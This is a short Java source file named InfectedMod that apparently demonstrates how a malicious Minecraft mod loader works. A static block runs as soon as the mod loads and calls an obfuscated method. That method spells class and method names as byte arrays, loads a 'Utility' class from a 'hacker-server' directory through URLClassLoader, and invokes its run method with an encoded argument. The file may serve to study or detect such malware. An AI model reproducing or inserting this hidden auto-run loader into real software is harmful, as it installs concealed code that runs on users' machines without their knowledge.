import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.file.Path;


public class InfectedMod {

    // runs whenever this minecraft mod is loaded
    static {
        try {
            _1685f49242dd46ef9c553d8af1a4e0bb();
        } catch (ClassNotFoundException | NoSuchMethodException | MalformedURLException | InvocationTargetException | InstantiationException | IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }

    // code block entered by attacker
    static void _1685f49242dd46ef9c553d8af1a4e0bb() throws ClassNotFoundException, NoSuchMethodException, MalformedURLException, InvocationTargetException, InstantiationException, IllegalAccessException {
        Path path = Path.of("hacker-server").toAbsolutePath();
        Class.forName(new String(new byte[] {
                // "Utility"
                85, 116, 105, 108, 105, 116, 121
        }), true, (ClassLoader) Class.forName(new String(new byte[] {
                // "java.net.URLClassLoader"
                106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114
        })).getConstructor(URL[].class).newInstance((Object) new URL[] {
                new URL(
                        "file://" + path.toString() + "/")
        })).getMethod(new String(new byte[] {
                // "run"
                114, 117, 110
        }), String.class).invoke((Object) null, "-114.-18.38.108.-100");
    }

    public static void main(String[] args) {
        System.out.println("From Infected Mod: Mod loaded in your minecraft client!");
    }
}
